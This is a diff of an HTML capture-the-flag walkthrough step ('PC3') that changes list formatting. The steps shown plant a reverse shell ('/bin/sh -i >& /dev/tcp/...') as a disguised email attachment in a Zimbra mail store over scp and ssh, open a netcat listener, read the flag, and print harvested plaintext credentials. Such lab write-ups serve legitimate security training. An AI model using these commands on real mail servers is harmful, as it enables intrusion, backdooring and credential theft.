@@ -60,11 +60,10 @@ color: #ff9800;
 <body>
 <h1 id="pc3">PC3</h1>
 <ol type="1">
-<li>Resume From <a href="/2_mail_server/">🗂 Mail Server</a></li>
-<li>Check Emails: <a href="/2_mail_server/08-store0/3/msg/0/258-3.msg">🗂 258-3.msg</a></li>
-</ol>
-<pre class="text"><code>سلام
-نرم افزار درخواست شده را پیوست کردم.</code></pre>
+<li><p><strong>Resume From <a href="/2_mail_server/">Mail Server</a></strong></p></li>
+<li><p><strong>Check Emails: <a href="/2_mail_server/08-store0/3/msg/0/258-3.msg">258-3.msg</a></strong></p>
+<pre class="text"><code>**سلام
+نرم افزار درخواست شده را پیوست کردم.**</code></pre>
 <pre class="shell"><code>#!/bin/bash
 
 username=&quot;&quot;
@@ -96,20 +95,14 @@ logout)
   printf &quot;\033[1m\033[91mNot Connected!\033[0m&quot;
  fi
  printf &quot;\n\n&quot;
-esac</code></pre>
-<ol start="3" type="1">
-<li>Create a Reverse Shell Payload</li>
-</ol>
-<pre class="shell"><code>ls;/bin/sh -i &gt;&amp; /dev/tcp/10.8.0.29/9999 0&gt;&amp;1;</code></pre>
-<ol start="4" type="1">
-<li>Encode Base64 and Replace as <code>kerio_connect</code> attachment: <a href="./04-258-3-backdoor.msg">🗂 kerio_connect</a></li>
-<li>Listen On local System: <code>nc -l 0.0.0.0 9999</code></li>
-<li>Copy Backdoored Email into Server</li>
-</ol>
-<pre class="shell"><code>scp -i ~/.ssh/id_rsa -P 2200 ./04-258-3-backdoor.msg  zimbra@172.16.3.67:/opt/zimbra/store/0/3/msg/0</code></pre>
-<ol start="7" type="1">
-<li>Login and Replace Email, Restart Zimbra</li>
-</ol>
+esac</code></pre></li>
+<li><p><strong>Create a Reverse Shell Payload</strong></p>
+<pre class="shell"><code>ls;/bin/sh -i &gt;&amp; /dev/tcp/10.8.0.29/9999 0&gt;&amp;1;</code></pre></li>
+<li><p><strong>Encode Base64 and Replace as <code>kerio_connect</code> attachment: <a href="./04-258-3-backdoor.msg">kerio_connect</a></strong></p></li>
+<li><p><strong>Listen On local System: <code>nc -l 0.0.0.0 9999</code></strong></p></li>
+<li><p><strong>Copy Backdoored Email into Server</strong></p>
+<pre class="shell"><code>scp -i ~/.ssh/id_rsa -P 2200 ./04-258-3-backdoor.msg  zimbra@172.16.3.67:/opt/zimbra/store/0/3/msg/0</code></pre></li>
+<li><p><strong>Login and Replace Email, Restart Zimbra</strong></p>
 <pre class="shell"><code>ssh -i ~/.ssh/id_rsa -p 2200 zimbra@172.16.3.67
 
 # inside ssh
@@ -118,13 +111,12 @@ mv 258-3.msg 258-3.bak.msg
 mv 04-258-3-backdoor.msg 258-3.msg
 
 # restarting Zimbra
-zmcontrol restart</code></pre>
-<ol start="8" type="1">
-<li>Read Flag: MAZAPA_e8be86e920cb98bc93e7d3803912e72a</li>
-<li>Read <code>/read.py</code> and Get Username/Password</li>
-</ol>
+zmcontrol restart</code></pre></li>
+<li><p><strong>Read Flag: <code>MAZAPA_e8be86e920cb98bc93e7d3803912e72a</code></strong></p></li>
+<li><p><strong>Read <code>/read.py</code> and Get Username/Password</strong></p>
 <pre class="text"><code>username = &quot;savad-koohi@petromaz.ir&quot;
 password = &quot;EmdQXL82YejA&quot;
-server = &quot;mail&quot;</code></pre>
+server = &quot;mail&quot;</code></pre></li>
+</ol>
 </body>
 </html>
